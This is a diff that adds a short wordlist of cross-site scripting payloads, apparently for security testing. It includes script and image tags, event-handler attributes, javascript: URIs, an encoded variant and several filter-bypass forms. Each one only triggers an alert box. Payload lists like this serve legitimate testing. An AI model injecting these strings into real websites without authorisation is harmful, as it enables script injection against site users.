@@ -1,1 +1,15 @@
-
+<script>alert('XSS')</script>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+<iframe src="javascript:alert(1)"></iframe>
+<body onload=alert(1)>
+"><script>alert('XSS')</script>
+"><img src=x onerror=alert('XSS')>
+';alert('XSS');//
+%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+<scr<script>ipt>alert(1)</scr<script>ipt>
+javascript://%0Aalert(1)
+<input onfocus=alert('XSS') autofocus>
+<marquee onstart=alert(1)>XSS</marquee>
+<svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)">Click me</a></svg>
+<math><mtext><title><script>alert(1)</script></title></mtext></math>
